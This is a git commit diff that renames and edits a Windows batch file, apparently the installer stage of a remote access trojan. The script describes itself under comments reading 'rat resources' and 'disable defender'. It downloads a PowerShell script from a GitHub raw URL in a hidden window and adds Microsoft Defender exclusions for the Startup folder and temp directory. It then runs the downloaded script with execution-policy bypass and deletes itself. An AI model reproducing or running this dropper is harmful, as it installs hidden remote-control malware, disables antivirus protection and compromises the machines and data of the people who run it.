f6663aee1262bb898fcb45497a5baebe80dda070
gozen-foto <gofoto.zen@proton.me>
2026-06-01 16:26:42 +0530

    Update and rename wget.cmd to goget.cmd

--- installer/goget.cmd
+++ installer/goget.cmd
@@ -31,10 +31,10 @@ if '%errorlevel%' NEQ '0' (
 REM disable defender
 
 REM rat resources
-powershell powershell.exe -Windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/installer.ps1 -OutFile installer.ps1";
+powershell powershell.exe -Windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/installer/installer.ps1 -OutFile installer.ps1";
 Add-MpPreference -ExclusionPath "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup";
 Add-MpPreference -ExclusionPath "$env:temp";
 powershell powershell.exe -Windowstyle hidden -ep bypass "./installer.ps1"
 
 @REM self delete
-del wget.cmd
+del goget.cmd
